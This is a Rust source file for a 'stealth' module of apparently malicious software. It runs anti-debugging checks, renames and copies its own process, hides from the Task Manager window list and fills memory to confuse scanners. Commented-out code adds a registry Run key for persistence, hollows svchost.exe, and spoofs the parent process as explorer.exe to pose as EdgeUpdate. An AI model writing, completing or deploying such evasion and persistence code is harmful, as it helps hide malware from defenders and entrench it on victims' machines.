use std::env;

pub mod process_hiding;
pub mod anti_debug;
pub mod injection;
pub mod task_manager;
pub mod ppid_spoofing;
// pub mod hollowing;

pub struct ProcessStealth;

impl ProcessStealth {
    // Simple stealth methods that don't require complex Windows APIs
    pub fn scramble_memory() {
        // Allocate and fill random memory to confuse memory scanners
        for _ in 0..5 {
            let _dummy: Vec<u8> = (0..512).map(|_| rand::random::<u8>()).collect();
            std::thread::sleep(std::time::Duration::from_millis(1));
        }
    }
}

// ...

pub fn init() -> String {
    println!("Advanced stealth module initialized");
    let mut status_msg = String::from("Stealth: Active");
    
    // 1. Anti-Debugging checks
    anti_debug::ensure_no_debug();

    // 2. Install to Hidden Location & Persistence
    // DISABLED FOR DEV: Uncomment for production
    /*
    match installation::install_to_hidden_location() {
        Ok(hidden_path) => {
            println!("Ensured installation at: {:?}", hidden_path);
            if let Some(file_name) = hidden_path.file_name() {
                let _ = registry::add_registry_run_key(
                    &file_name.to_string_lossy(), 
                    hidden_path.to_str().unwrap()
                );
            }
        },
        Err(e) => println!("Installation failed: {}", e),
    }
    */

    // 3. Process Name Randomization (Self-morphing)
    if !process_hiding::is_stealth_name() {
        println!("Process name is not stealthy. Preparing stealth copy...");
        match process_hiding::prepare_stealth_copy() {
            Ok(new_path) => {
                let msg = format!("Stealth copy prepared at: {:?}", new_path);
                println!("{}", msg);
                status_msg = format!("Stealth: Hollowing...");
                crate::log_info!("Attempting Option 3: Process Hollowing into svchost.exe");

                // OPTION 3: Process Hollowing (The "Holy Grail")
                // We try to inject into a legitimate 64-bit system process
                let _target_process = "C:\\Windows\\System32\\svchost.exe";
                
                // Note: We need to expose hollowing mod first
                // Assuming hollowing mod is public
                
                // Since hollowing is complex and might crash, we wrap it.
                // Actually, we need to import it. Let's assume mod hollowing exists.
                
                // For now, since I haven't added 'mod hollowing' to lib yet, I will do it in next step.
                // But logically:
                
                /*
                // HOLLOWING DISABLED DUE TO BUILD ERROR - FOCUS ON AI STREAMING
                // let hollowing_result = unsafe { hollowing::hollow_process(target_process) };
                let hollowing_result: Result<(), String> = Err("Hollowing disabled".to_string());
                match hollowing_result {
                    Ok(_) => {
                        crate::log_info!("Hollowing successful! Running inside svchost.exe");
                        std::process::exit(0);
                    },
                    Err(e) => {
                        crate::log_error!("Hollowing failed (Likely AV): {}. Falling back to EdgeUpdate Spoofing.", e);
                        
                        // FALLBACK TO OPTION 2 (EdgeUpdate)
                        crate::log_info!("Spawning EdgeUpdate spoof process...");
                        match ppid_spoofing::launch_with_parent(new_path.to_str().unwrap(), "explorer.exe") {
                            Ok(_) => {
                                crate::log_info!("EdgeUpdate launch successful. Exiting.");
                                std::process::exit(0);
                            },
                            Err(e) => crate::log_error!("EdgeUpdate failed: {}", e),
                        }
                    }
                }
                */
                
                /*
                // RE-ENABLING EDGE UPDATE FOR NOW UNTIL HOLLOWING MOD IS LINKED
                crate::log_info!("Spawning stealth process (EdgeUpdate Context)...");
                match ppid_spoofing::launch_with_parent(new_path.to_str().unwrap(), "explorer.exe") {
                    Ok(_) => {
                        crate::log_info!("Stealth launch successful. Exiting original process.");
                        std::process::exit(0);
                    },
                    Err(e) => {
                        crate::log_error!("PPID Spoofing failed: {}", e);
                    },
                }
                */
            },
            Err(e) => println!("Failed to prepare stealth copy: {}", e),
        }
    } else {
        status_msg = String::from("Stealth: Running as System Process");
    }

    // 4. Hide from Task Manager / Window List
    task_manager::hide_from_window_list();

    // Apply simple stealth techniques
    ProcessStealth::scramble_memory();
    
    status_msg
}
